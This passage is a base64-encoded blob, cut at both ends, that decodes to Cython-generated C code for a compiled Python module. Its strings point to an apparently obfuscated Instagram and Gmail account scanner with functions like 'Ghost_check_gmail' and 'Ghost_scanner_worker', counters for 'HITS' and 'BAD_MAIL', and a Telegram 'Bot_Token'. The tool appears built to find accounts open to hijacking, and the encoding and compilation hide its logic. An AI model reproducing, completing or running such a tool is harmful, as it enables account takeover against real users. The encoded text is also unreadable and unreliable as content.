B5eF9YR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEwKTsKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lLCBfX3B5eF90XzEwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ5MCwgX19weXhfTDEzX2V4Y2VwdF9lcnJvcikKICAgICAgICAgewoKICAgICAgICAgIAogICAgICAgICAgX19weXhfdF85ID0gTlVMTDsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTsKICAgICAgICAgIF9fcHl4X3RfMiA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogICAgICAgICAgX19weXhfdF82ID0gMTsKICAgICAgICAgIHsKICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV99OwogICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQ5MSwgX19weXhfTDI0X2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIH0KCiAgICAgICAgCiAgICAgICAgIHsKICAgICAgICAgIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5T2JqZWN0X0RlbEF0dHJTdHIoX19weXhfbSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2UpIDwgMCkpIHsgaWYgKGxpa2VseShQeUVycl9FeGNlcHRpb25NYXRjaGVzKFB5RXhjX0F0dHJpYnV0ZUVycm9yKSkpIFB5RXJyX0NsZWFyKCk7IGVsc2UgX19QWVhfRVJSKDAsIDQ5MCwgX19weXhfTDEzX2V4Y2VwdF9lcnJvcikgfQogICAgICAgICAgICBnb3RvIF9fcHl4X0wyNTsKICAgICAgICAgIH0KICAgICAgICAgIF9fcHl4X0wyNF9lcnJvcjo7CiAgICAgICAgICB7CiAgICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgICAgICAgICBfX3B5eF90XzE1ID0gMDsgX19weXhfdF8xNiA9IDA7IF9fcHl4X3RfMTcgPSAwOyBfX3B5eF90XzE4ID0gMDsgX19weXhfdF8xOSA9IDA7IF9fcHl4X3RfMjAgPSAwOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU3dhcCgmX19weXhfdF8xOCwgJl9fcHl4X3RfMTksICZfX3B5eF90XzIwKTsKICAgICAgICAgICAgaWYgKCB1bmxpa2VseShfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMTUsICZfX3B5eF90XzE2LCAmX19weXhfdF8xNykgPCAwKSkgX19QeXhfRXJyRmV0Y2goJl9fcHl4X3RfMTUsICZfX3B5eF90XzE2LCAmX19weXhfdF8xNyk7CiAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNSk7CiAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNik7CiAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNyk7CiAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xOCk7CiAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xOSk7CiAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yMCk7CiAgICAgICAgICAgIF9fcHl4X3RfMTIgPSBfX3B5eF9saW5lbm87IF9fcHl4X3RfMTMgPSBfX3B5eF9jbGluZW5vOyBfX3B5eF90XzE0ID0gX19weXhfZmlsZW5hbWU7CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfUHlPYmplY3RfRGVsQXR0clN0cihfX3B5eF9tLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZSkgPCAwKSkgeyBpZiAobGlrZWx5KFB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfQXR0cmlidXRlRXJyb3IpKSkgUHlFcnJfQ2xlYXIoKTsgZWxzZSBfX1BZWF9FUlIoMCwgNDkwLCBfX3B5eF9MMjlfZXJyb3IpIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE4KTsKICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xOSk7CiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjApOwogICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzE4LCBfX3B5eF90XzE5LCBfX3B5eF90XzIwKTsKICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNSk7CiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTYpOwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE3KTsKICAgICAgICAgICAgX19QeXhfRXJyUmVzdG9yZShfX3B5eF90XzE1LCBfX3B5eF90XzE2LCBfX3B5eF90XzE3KTsKICAgICAgICAgICAgX19weXhfdF8xNSA9IDA7IF9fcHl4X3RfMTYgPSAwOyBfX3B5eF90XzE3ID0gMDsgX19weXhfdF8xOCA9IDA7IF9fcHl4X3RfMTkgPSAwOyBfX3B5eF90XzIwID0gMDsKICAgICAgICAgICAgX19weXhfbGluZW5vID0gX19weXhfdF8xMjsgX19weXhfY2xpbmVubyA9IF9fcHl4X3RfMTM7IF9fcHl4X2ZpbGVuYW1lID0gX19weXhfdF8xNDsKICAgICAgICAgICAgZ290byBfX3B5eF9MMTNfZXhjZXB0X2Vycm9yOwogICAgICAgICAgICBfX3B5eF9MMjlfZXJyb3I6OwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE4KTsKICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xOSk7CiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjApOwogICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzE4LCBfX3B5eF90XzE5LCBfX3B5eF90XzIwKTsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDsKICAgICAgICAgICAgX19weXhfdF8xOCA9IDA7IF9fcHl4X3RfMTkgPSAwOyBfX3B5eF90XzIwID0gMDsKICAgICAgICAgICAgZ290byBfX3B5eF9MMTNfZXhjZXB0X2Vycm9yOwogICAgICAgICAgfQogICAgICAgICAgX19weXhfTDI1OjsKICAgICAgICB9CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgICBnb3RvIF9fcHl4X0wxMl9leGNlcHRpb25faGFuZGxlZDsKICAgICAgfQogICAgICBnb3RvIF9fcHl4X0wxM19leGNlcHRfZXJyb3I7CgogICAgICAKICAgICAgX19weXhfTDEzX2V4Y2VwdF9lcnJvcjo7CiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpOwogICAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgICBfX3B5eF9MMTJfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzgsIF9fcHl4X3RfNywgX19weXhfdF8xKTsKICAgICAgX19weXhfTDE2X3RyeV9lbmQ6OwogICAgfQoKICAgIAogIH0KCiAgCiAgX19weXhfdF8zID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Rlc3QsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCgogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsKICBpZiAoX19weXhfbSkgewogICAgaWYgKF9fcHl4X21zdGF0ZS0+X19weXhfZCAmJiBzdHJpbmd0YWJfaW5pdGlhbGl6ZWQpIHsKICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJpbml0IHRmIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgICB9CiAgICAjaWYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCiAgICBQeV9DTEVBUihfX3B5eF9tKTsKICAgICNlbHNlCiAgICBQeV9ERUNSRUYoX19weXhfbSk7CiAgICBpZiAocHlzdGF0ZV9hZGRtb2R1bGVfcnVuKSB7CiAgICAgIFB5T2JqZWN0ICp0cCwgKnZhbHVlLCAqdGI7CiAgICAgIFB5RXJyX0ZldGNoKCZ0cCwgJnZhbHVlLCAmdGIpOwogICAgICBQeVN0YXRlX1JlbW92ZU1vZHVsZSgmX19weXhfbW9kdWxlZGVmKTsKICAgICAgUHlFcnJfUmVzdG9yZSh0cCwgdmFsdWUsIHRiKTsKICAgIH0KICAgICNlbmRpZgogIH0gZWxzZSBpZiAoIVB5RXJyX09jY3VycmVkKCkpIHsKICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19JbXBvcnRFcnJvciwgImluaXQgdGYiKTsKICB9CiAgX19weXhfTDA6OwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogICNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKICByZXR1cm4gKF9fcHl4X20gIT0gTlVMTCkgPyAwIDogLTE7CiAgI2Vsc2UKICByZXR1cm4gX19weXhfbTsKICAjZW5kaWYKfQoKCnR5cGVkZWYgc3RydWN0IHsKICAgIGNvbnN0IGNoYXIgKnM7CiNpZiA5OTMgPD0gNjU1MzUKICAgIGNvbnN0IHVuc2lnbmVkIHNob3J0IG47CiNlbGlmIDk5MyAvIDIgPCBJTlRfTUFYCiAgICBjb25zdCB1bnNpZ25lZCBpbnQgbjsKI2VsaWYgOTkzIC8gMiA8IExPTkdfTUFYCiAgICBjb25zdCB1bnNpZ25lZCBsb25nIG47CiNlbHNlCiAgICBjb25zdCBQeV9zc2l6ZV90IG47CiNlbmRpZgojaWYgMSA8PSAzMQogICAgY29uc3QgdW5zaWduZWQgaW50IGVuY29kaW5nIDogNTsKI2VsaWYgMSA8PSAyNTUKICAgIGNvbnN0IHVuc2lnbmVkIGNoYXIgZW5jb2Rpbmc7CiNlbGlmIDEgPD0gNjU1MzUKICAgIGNvbnN0IHVuc2lnbmVkIHNob3J0IGVuY29kaW5nOwojZWxzZQogICAgY29uc3QgUHlfc3NpemVfdCBlbmNvZGluZzsKI2VuZGlmCiAgICBjb25zdCB1bnNpZ25lZCBpbnQgaXNfdW5pY29kZSA6IDE7CiAgICBjb25zdCB1bnNpZ25lZCBpbnQgaW50ZXJuIDogMTsKfSBfX1B5eF9TdHJpbmdUYWJFbnRyeTsKc3RhdGljIGNvbnN0IGNoYXIgKiBjb25zdCBfX3B5eF9zdHJpbmdfdGFiX2VuY29kaW5nc1tdID0geyAwIH07CnN0YXRpYyBjb25zdCBfX1B5eF9TdHJpbmdUYWJFbnRyeSBfX3B5eF9zdHJpbmdfdGFiW10gPSB7CiAge19fcHl4X2tfLCBzaXplb2YoX19weXhfa18pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMCwgc2l6ZW9mKF9fcHl4X2tfMCksIDAsIDEsIDB9LCAKICB7X19weXhfa18wXzBfbnVsbF9udWxsX3dlYl9nbGlmX3NpZ251cF8wLCBzaXplb2YoX19weXhfa18wXzBfbnVsbF9udWxsX3dlYl9nbGlmX3NpZ251cF8wKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzBkMDY3YzJmODZjYWMyYzE3ZDY1NTYzMWM5Y2VjMjQwLCBzaXplb2YoX19weXhfa18wZDA2N2MyZjg2Y2FjMmMxN2Q2NTU2MzFjOWNlYzI0MCksIDAsIDEsIDB9LCAKICB7X19weXhfa18wZGZhZjgyMF8yNzQ4XzQ2MzRfOTM2NV9jM2Q4YzgwMSwgc2l6ZW9mKF9fcHl4X2tfMGRmYWY4MjBfMjc0OF80NjM0XzkzNjVfYzNkOGM4MDEpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMG0sIHNpemVvZihfX3B5eF9rXzBtKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzEsIHNpemVvZihfX3B5eF9rXzEpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMTcwMDI1MTU3NF85ODIsIHNpemVvZihfX3B5eF9rXzE3MDAyNTE1NzRfOTgyKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzFfMDAwLCBzaXplb2YoX19weXhfa18xXzAwMCksIDAsIDEsIDB9LCAKICB7X19weXhfa18xZjc4NDQzMV8yNjYzXzRkYjlfYjYyNF84NmJkOWNlMSwgc2l6ZW9mKF9fcHl4X2tfMWY3ODQ0MzFfMjY2M180ZGI5X2I2MjRfODZiZDljZTEpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMWticHMsIHNpemVvZihfX3B5eF9rXzFrYnBzKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzFtLCBzaXplb2YoX19weXhfa18xbSksIDAsIDEsIDB9LCAKICB7X19weXhfa18yMDIwXzIwMjMsIHNpemVvZihfX3B5eF9rXzIwMjBfMjAyMyksIDAsIDEsIDB9LCAKICB7X19weXhfa18yMl8yQzBfMkMwXzJDMV8yQ251bGxfMkMwXzJDNTE2LCBzaXplb2YoX19weXhfa18yMl8yQzBfMkMwXzJDMV8yQ251bGxfMkMwXzJDNTE2KSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzIyXzJDXzIyLCBzaXplb2YoX19weXhfa18yMl8yQ18yMiksIDAsIDEsIDB9LCAKICB7X19weXhfa18yM182XzAsIHNpemVvZihfX3B5eF9rXzIzXzZfMCksIDAsIDEsIDB9LCAKICB7X19weXhfa18yNF83XzAsIHNpemVvZihfX3B5eF9rXzI0XzdfMCksIDAsIDEsIDB9LCAKICB7X19weXhfa18yNV83XzFfMSwgc2l6ZW9mKF9fcHl4X2tfMjVfN18xXzEpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMjZfOF8wLCBzaXplb2YoX19weXhfa18yNl84XzApLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMjdfOF8xLCBzaXplb2YoX19weXhfa18yN184XzEpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMjhfOV8wLCBzaXplb2YoX19weXhfa18yOF85XzApLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8xMThtLCBzaXplb2YoX19weXhfa18zOF81XzExOG0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8xOThtLCBzaXplb2YoX19weXhfa18zOF81XzE5OG0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8yMDhtLCBzaXplb2YoX19weXhfa18zOF81XzIwOG0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV85M20sIHNpemVvZihfX3B5eF9rXzM4XzVfOTNtKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzNiclR2dywgc2l6ZW9mKF9fcHl4X2tfM2JyVHZ3KSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzQsIHNpemVvZihfX3B5eF9rXzQpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfNTBjYzY4NjFfNzAzNl80M2I0XzgwMmVfZmI0MjgyNzksIHNpemVvZihfX3B5eF9rXzUwY2M2ODYxXzcwMzZfNDNiNF84MDJlX2ZiNDI4Mjc5KSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzU2NzA2NzM0MzM1MjQyNywgc2l6ZW9mKF9fcHl4X2tfNTY3MDY3MzQzMzUyNDI3KSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzc3MTcyNjk0ODgzMzYwMDEsIHNpemVvZihfX3B5eF9rXzc3MTcyNjk0ODgzMzYwMDEpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfOTFtLCBzaXplb2YoX19weXhfa185MW0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfOTJtLCBzaXplb2YoX19weXhfa185Mm0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfOTNtLCBzaXplb2YoX19weXhfa185M20pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfOTRtLCBzaXplb2YoX19weXhfa185NG0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfOTVtLCBzaXplb2YoX19weXhfa185NW0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfOTZtLCBzaXplb2YoX19weXhfa185Nm0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfOTdtLCBzaXplb2YoX19weXhfa185N20pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfOXkzTjVrTHF6aWFsUUE3ejk2QU1peUFLTE1CV3BxVmosIHNpemVvZihfX3B5eF9rXzl5M041a0xxemlhbFFBN3o5NkFNaXlBS0xNQldwcVZqKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0FTVVMsIHNpemVvZihfX3B5eF9rX0FTVVMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfQWNjZXB0X0VuY29kaW5nLCBzaXplb2YoX19weXhfa19BY2NlcHRfRW5jb2RpbmcpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfQWNjZXB0X0xhbmd1YWdlLCBzaXplb2YoX19weXhfa19BY2NlcHRfTGFuZ3VhZ2UpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfQkFELCBzaXplb2YoX19weXhfa19CQUQpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfQkFEX01BSUwsIHNpemVvZihfX3B5eF9rX0JBRF9NQUlMKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0JMVUUsIHNpemVvZihfX3B5eF9rX0JMVUUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfQk9MRCwgc2l6ZW9mKF9fcHl4X2tfQk9MRCksIDAsIDEsIDF9LCAKICB7X19weXhfa19Cb3RfVG9rZW4sIHNpemVvZihfX3B5eF9rX0JvdF9Ub2tlbiksIDAsIDEsIDB9LCAKICB7X19weXhfa19DLCBzaXplb2YoX19weXhfa19DKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0NZQU4sIHNpemVvZihfX3B5eF9rX0NZQU4pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfQ2hhbm5lbCwgc2l6ZW9mKF9fcHl4X2tfQ2hhbm5lbCksIDAsIDEsIDF9LCAKICB7X19weXhfa19Db2xvcnMsIHNpemVvZihfX3B5eF9rX0NvbG9ycyksIDAsIDEsIDF9LCAKICB7X19weXhfa19Db25uZWN0aW9uLCBzaXplb2YoX19weXhfa19Db25uZWN0aW9uKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0NvbnRlbnRfVHlwZSwgc2l6ZW9mKF9fcHl4X2tfQ29udGVudF9UeXBlKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0Nvb2tpZSwgc2l6ZW9mKF9fcHl4X2tfQ29va2llKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0RldmVsb3Blciwgc2l6ZW9mKF9fcHl4X2tfRGV2ZWxvcGVyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0RldnNfR0hPU1RfUkZYLCBzaXplb2YoX19weXhfa19EZXZzX0dIT1NUX1JGWCksIDAsIDEsIDB9LCAKICB7X19weXhfa19FbWFpbCwgc2l6ZW9mKF9fcHl4X2tfRW1haWwpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfRmFsc2UsIHNpemVvZihfX3B5eF9rX0ZhbHNlKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0ZvbGxvd2Vycywgc2l6ZW9mKF9fcHl4X2tfRm9sbG93ZXJzKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0ZvbGxvd2luZywgc2l6ZW9mKF9fcHl4X2tfRm9sbG93aW5nKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0dIT1NULCBzaXplb2YoX19weXhfa19HSE9TVCksIDAsIDEsIDF9LCAKICB7X19weXhfa19HUkVFTiwgc2l6ZW9mKF9fcHl4X2tfR1JFRU4pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfR2hvc3QsIHNpemVvZihfX3B5eF9rX0dob3N0KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0dob3N0X0luZm9BY2MsIHNpemVvZihfX3B5eF9rX0dob3N0X0luZm9BY2MpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfR2hvc3RfX19pbml0LCBzaXplb2YoX19weXhfa19HaG9zdF9fX2luaXQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfR2hvc3RfYWR2YW5jZWRfc2Nhbm5lciwgc2l6ZW9mKF9fcHl4X2tfR2hvc3RfYWR2YW5jZWRfc2Nhbm5lciksIDAsIDEsIDF9LCAKICB7X19weXhfa19HaG9zdF9hZHZhbmNlZF9zY2FubmVyX2xvY2Fsc19nZSwgc2l6ZW9mKF9fcHl4X2tfR2hvc3RfYWR2YW5jZWRfc2Nhbm5lcl9sb2NhbHNfZ2UpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfR2hvc3RfY2hlY2ssIHNpemVvZihfX3B5eF9rX0dob3N0X2NoZWNrKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0dob3N0X2NoZWNrX2dtYWlsLCBzaXplb2YoX19weXhfa19HaG9zdF9jaGVja19nbWFpbCksIDAsIDEsIDF9LCAKICB7X19weXhfa19HaG9zdF9jcmVhdGVfYmFubmVyLCBzaXplb2YoX19weXhfa19HaG9zdF9jcmVhdGVfYmFubmVyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0dob3N0X2NyZWF0ZV9kYXNoYm9hcmQsIHNpemVvZihfX3B5eF9rX0dob3N0X2NyZWF0ZV9kYXNoYm9hcmQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfR2hvc3RfZGF0ZSwgc2l6ZW9mKF9fcHl4X2tfR2hvc3RfZGF0ZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19HaG9zdF9nZW5lcmF0ZV91c2VyX2lkLCBzaXplb2YoX19weXhfa19HaG9zdF9nZW5lcmF0ZV91c2VyX2lkKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0dob3N0X2dldF9jb3VudGVyLCBzaXplb2YoX19weXhfa19HaG9zdF9nZXRfY291bnRlciksIDAsIDEsIDF9LCAKICB7X19weXhfa19HaG9zdF9pbmNyZW1lbnRfY291bnRlciwgc2l6ZW9mKF9fcHl4X2tfR2hvc3RfaW5jcmVtZW50X2NvdW50ZXIpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfR2hvc3RfcmVzdCwgc2l6ZW9mKF9fcHl4X2tfR2hvc3RfcmVzdCksIDAsIDEsIDF9LCAKICB7X19weXhfa19HaG9zdF9ydW4sIHNpemVvZihfX3B5eF9rX0dob3N0X3J1biksIDAsIDEsIDF9LCAKICB7X19weXhfa19HaG9zdF9zY2FubmVyX3dvcmtlciwgc2l6ZW9mKF9fcHl4X2tfR2hvc3Rfc2Nhbm5lcl93b3JrZXIpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfR2hvc3Rfc2V0X2FjdGl2ZV90aHJlYWRzLCBzaXplb2YoX19weXhfa19HaG9zdF9zZXRfYWN0aXZlX3RocmVhZHMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfR2hvc3RfdGxsLCBzaXplb2YoX19weXhfa19HaG9zdF90bGwpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfR2hvc3RfdGxsX2xvY2Fsc19nZW5leHByLCBzaXplb2YoX19weXhfa19HaG9zdF90bGxfbG9jYWxzX2dlbmV4cHIpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfSElUUywgc2l6ZW9mKF9fcHl4X2tfSElUUyksIDAsIDEsIDB9LCAKICB7X19weXhfa19IVEMsIHNpemVvZihfX3B5eF9rX0hUQyksIDAsIDEsIDF9LCAKICB7X19weXhfa19IVUFXRUksIHNpemVvZihfX3B5eF9rX0hVQVdFSSksIDAsIDEsIDF9LCAKICB7X19weXhfa19Ib3N0LCBzaXplb2YoX19weXhfa19Ib3N0KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0hvc3RfR0FQUywgc2l6ZW9mKF9fcHl4X2tfSG9zdF9HQVBTKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0lkLCBzaXplb2YoX19weXhfa19JZCksIDAsIDEsIDF9LCAKICB7X19weXhfa19JbmZvQWNjLCBzaXplb2YoX19weXhfa19JbmZvQWNjKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0luc3RhZ3JhbV8xMDBfMF8wXzE3XzEyOV9BbmRyb2lkLCBzaXplb2YoX19weXhfa19JbnN0YWdyYW1fMTAwXzBfMF8xN18xMjlfQW5kcm9pZCksIDAsIDEsIDB9LCAKICB7X19weXhfa19JbnN0YWdyYW1fMzExXzBfMF8zMl8xMThfQW5kcm9pZCwgc2l6ZW9mKF9fcHl4X2tfSW5zdGFncmFtXzMxMV8wXzBfMzJfMTE4X0FuZHJvaWQpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfSm9pbmVkX1llYXIsIHNpemVvZihfX3B5eF9rX0pvaW5lZF9ZZWFyKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0tleWJvYXJkSW50ZXJydXB0LCBzaXplb2YoX19weXhfa19LZXlib2FyZEludGVycnVwdCksIDAsIDEsIDF9LCAKICB7X19weXhfa19MR0VfbGdlLCBzaXplb2YoX19weXhfa19MR0VfbGdlKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0xJTUUsIHNpemVvZihfX3B5eF9rX0xJTUUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfTGlnZXIsIHNpemVvZihfX3B5eF9rX0xpZ2VyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0xvY2ssIHNpemVvZihfX3B5eF9rX0x